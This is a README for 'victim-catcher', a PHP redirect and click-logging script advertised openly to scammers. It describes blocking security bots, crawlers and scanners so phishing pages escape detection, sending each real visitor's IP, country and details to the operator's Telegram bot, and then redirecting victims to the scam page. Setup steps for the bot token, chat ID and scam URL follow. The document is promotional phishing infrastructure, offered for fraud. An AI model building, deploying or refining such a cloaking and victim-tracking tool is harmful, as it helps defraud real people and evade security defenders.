# victim-catcher

**A ruthless PHP redirect & click logger for scammers — blocks bots, snitches, and security crawlers while feeding you fresh victim info on Telegram.**

---

## 💀 Overview

`victim-catcher` is a PHP script that works as a **filter + logger + redirect** for scam/phish pages.  
It logs real visitor clicks to a **Telegram bot** and blocks unwanted bots, crawlers, and scanners before redirecting them to your main page.

---

## 🛠 Features

- 🛡 **Bot Protection** – Blocks requests from known user agents (security bots, crawlers, scrapers).
- 🗝 **Header Validation** – Ensures the request has required real browser headers.
- 🌍 **Geo Detection** – Gets IP, Country name, and Flag emoji.
- 📲 **Telegram Alerts** – Sends full visitor info to your Telegram bot instantly.
- 🔀 **Redirect** – For allowed visitors, redirects them to your main scam page.

---

## 📂 File Included

- **`redirect.php`** – Place this file before your scam page so all clicks go through it.

---

## ⚙️ Setup

1. **Upload** `redirect.php` to your hosting.
2. **Edit** these lines in the file:
   ```php
   $bot_token = 'BOT_TOKEN'; // Your Telegram Bot Token
   $chat_id = 'CHAT_ID';     // Your Telegram Chat ID
   $redirect_url = 'https://your.site/web/index.html'; // Your scam page URL
